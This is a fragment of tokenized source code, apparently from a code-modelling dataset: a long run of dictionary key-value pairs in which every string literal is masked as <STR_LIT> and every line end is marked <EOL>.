"<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , 